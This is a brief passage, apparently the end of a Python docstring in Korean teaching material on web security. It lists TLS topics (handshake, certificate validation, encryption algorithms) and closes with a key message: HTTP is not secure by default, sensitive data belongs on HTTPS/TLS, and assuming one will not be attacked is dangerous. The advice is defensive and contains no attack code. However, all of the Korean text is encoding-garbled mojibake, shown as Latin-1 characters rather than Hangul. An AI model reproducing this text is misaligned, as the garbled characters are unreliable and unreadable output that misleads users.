     * í•¸ë“œì…°ì´í¬ ê³¼ì •
     * ì¸ì¦ì„œ ê²€ì¦
     * ì•”í˜¸í™” ì•Œê³ ë¦¬ì¦˜

í•µì‹¬ ë©”ì‹œì§€:
HTTPëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ì•ˆì „í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤!
ëª¨ë“  ë¯¼ê°í•œ ë°ì´í„° ì „ì†¡ì—ëŠ” HTTPS/TLSë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤!
"ë‚˜ëŠ” ê³µê²©ë°›ì§€ ì•Šì„ ê²ƒ"ì´ë¼ëŠ” ìƒê°ì€ ìœ„í—˜í•©ë‹ˆë‹¤!
"""